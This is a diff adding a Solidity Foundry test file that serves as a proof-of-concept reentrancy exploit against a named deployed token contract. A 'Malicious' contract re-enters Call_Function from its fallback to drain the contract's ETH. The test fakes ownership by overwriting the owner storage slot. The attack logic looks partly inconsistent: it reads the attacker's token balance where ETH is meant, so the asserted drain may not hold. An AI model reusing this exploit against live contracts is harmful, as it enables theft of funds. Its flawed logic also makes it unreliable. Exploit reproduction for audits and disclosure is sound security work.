@@ -1,0 +1,74 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the vulnerable token contract
+interface IFFI_ERC20 {
+    function balanceOf(address tokenOwner) external view returns (uint256);
+    function Call_Function(address addr, uint256 value, bytes calldata data) external;
+    function transferOwnership(address _newOwner) external;
+    function acceptOwnership() external;
+    // Owner slot helpers (not needed in interface)
+}
+
+contract Malicious {
+    IFFI_ERC20 constant token = IFFI_ERC20(0x2815d3272baE3ebde5D7c128Eea5f4A8da402783);
+    uint256 counter;
+    uint256 constant MAX_RECURSION = 5;
+
+    fallback() external payable {
+        // Reentrancy: call Call_Function again to send remaining balance to self
+        counter++;
+        if (counter <= MAX_RECURSION) {
+            uint256 bal = token.balanceOf(address(this));
+            if (bal > 0) {
+                // Use empty bytes for data
+                token.Call_Function(address(this), bal, "");
+            }
+        }
+    }
+
+    function attack() external {
+        // Trigger the first external call – this will call our own fallback
+        token.Call_Function(address(this), 0, "");
+    }
+
+    function getCounter() external view returns (uint256) {
+        return counter;
+    }
+}
+
+contract ExploitTest is Test {
+    // Target token contract address (from report)
+    IFFI_ERC20 constant token = IFFI_ERC20(0x2815d3272baE3ebde5D7c128Eea5f4A8da402783);
+    Malicious malicious;
+
+    function setUp() public {
+        // Deploy attacker's malicious contract
+        malicious = new Malicious();
+
+        // Give the token contract some ETH (to be drained)
+        vm.deal(address(token), 100 ether);
+
+        // The vulnerability requires that the caller of Call_Function be the owner.
+        // We simulate that the attacker has become the owner (e.g., via a previous ownership transfer).
+        // Overwrite the owner storage slot (slot 0) with the malicious contract address.
+        vm.store(address(token), bytes32(uint256(0)), bytes32(uint256(address(malicious))));
+    }
+
+    function testReentrancyDrain() public {
+        uint256 initialTokenBalance = address(token).balance;
+        assertEq(initialTokenBalance, 100 ether);
+        assertEq(address(malicious).balance, 0);
+
+        // Initiate the reentrancy attack from the malicious contract (now the owner)
+        malicious.attack();
+
+        // After the attack, the token contract's ETH should be drained to the malicious contract
+        assertEq(address(token).balance, 0);
+        assertEq(address(malicious).balance, 100 ether);
+    }
+}
+```
